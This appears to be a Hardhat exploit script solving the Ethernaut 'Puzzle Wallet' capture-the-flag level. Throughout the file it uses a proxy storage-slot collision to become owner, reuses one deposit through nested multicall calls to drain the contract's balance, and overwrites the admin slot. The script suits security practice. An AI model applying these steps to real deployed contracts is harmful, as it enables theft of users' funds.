const { providers } = require("ethers")
const { ethers } = require("hardhat")

const puzzleWalletInstanceAddress = "0x2aA3Ae1FDa38D2Cb7e416A3E5a856d74DD56c5DC"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  // Get the Ethernaut Delegation contract

  console.log("Connecting to your instance of Puzzle Wallet")
  const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet")
  const puzzleWallet = await PuzzleWallet.attach(puzzleWalletInstanceAddress)

  // // Get the proposeNewAdmin() signature to call it on fallback

  console.log("Encoding 'proposeNewAdmin' function from PuzzleProxy")
  const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy")
  const proposeNewAdmin = PuzzleProxy.interface.encodeFunctionData("proposeNewAdmin", [
    deployer.address,
  ])

  console.log("Sending encoded 'proposeNewAdmin' to PuzzleWallet...")
  const tx = {
    to: puzzleWalletInstanceAddress,
    data: proposeNewAdmin,
  }
  const newAdmin = await deployer.sendTransaction(tx)
  await newAdmin.wait(1)

  // Adding ourselves to whitelist as we're now on waitlist

  console.log("Adding our address to whitelist...")
  const addToWhitelist = await puzzleWallet.addToWhitelist(deployer.address)
  await addToWhitelist.wait(1)

  console.log("Encoding 'deposit' function from PuzzleWallet")
  const depositData = PuzzleWallet.interface.encodeFunctionData("deposit", [])

  // console.log(depositData)

  console.log("Encoding 'multicall' function with deposit function as a parameter")
  const multicall = PuzzleWallet.interface.encodeFunctionData("multicall", [[depositData]])

  /* Calling Multicall with two multicalls as parameter */

  const startingBalance = await ethers.provider.getBalance(puzzleWalletInstanceAddress)
  console.log("Starting PuzzleWallet balance: " + ethers.utils.formatEther(startingBalance))

  console.log("Calling multicall() with two multicalls as parameter and sending 0.001 eth...")
  const multicallAttack = await puzzleWallet.multicall([multicall, multicall], {
    value: ethers.utils.parseEther("0.001"),
  })
  await multicallAttack.wait(1)

  const afterMulticallBalance = await ethers.provider.getBalance(puzzleWalletInstanceAddress)
  console.log(
    "PuzzleWallet balance after Multicall attack: " +
      ethers.utils.formatEther(afterMulticallBalance)
  )

  /* Sending all the money to a null contract to break PuzzleWallet */

  console.log("Sending all the money to a null contract to break PuzzleWallet with execute()...")
  const execute = await puzzleWallet.execute(deployer.address, afterMulticallBalance, 0x0)
  await execute.wait(1)

  const afterExecuteBalance = await ethers.provider.getBalance(puzzleWalletInstanceAddress)
  console.log(
    "PuzzleWallet balance after Execute: " + ethers.utils.formatEther(afterExecuteBalance)
  )

  /* Setting player as owner */

  console.log("Setting our address in the slot position of admin of ProxyWallet...")
  const setMaxBalance = await puzzleWallet.setMaxBalance(deployer.address)
  await setMaxBalance.wait(1)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
